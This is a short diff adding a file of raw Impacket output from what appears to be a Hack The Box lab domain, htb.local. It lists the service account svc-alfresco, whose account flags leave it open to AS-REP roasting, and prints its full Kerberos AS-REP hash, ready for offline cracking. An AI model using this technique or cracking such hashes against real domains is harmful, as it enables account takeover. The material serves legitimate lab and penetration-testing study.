@@ -1,0 +1,9 @@
+Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation
+
+Name          MemberOf                                                PasswordLastSet             LastLogon                   UAC      
+------------  ------------------------------------------------------  --------------------------  --------------------------  --------
+svc-alfresco  CN=Service Accounts,OU=Security Groups,DC=htb,DC=local  2020-03-24 07:13:51.172526  2020-03-24 07:14:11.860062  0x410200 
+
+
+
+$krb5asrep$23$svc-alfresco@HTB.LOCAL:c9e4df3e77b8c7dd2a10c1324ca44390$3563980342fde6594acbb7b0a19de2d6ffff75e098ebbaada0a87b0409c52a69895192c340448262e1a74762a2dd47c56e798ffa81c64cf3cc0ba59ba90998b10358c33daa207a2f2f1ab160298f37484a7f309e59bf49b5c140966cb5a109b8c7ec95acf778ae53764708e2ba246ebc25106a57cfa04830192e35bb70f041826c71c2c0863659a8e98a862e994439e13d076f83318587447cae43564d1d48e738ae6e087ded0253fc42529054254e19197bf459f8c52cfb2ab0d54809c9f79bbc7c65425dc987532e491bb12fe2f107ff3aa8d2c96dd75a192e153bcca003707a4e8e264c95
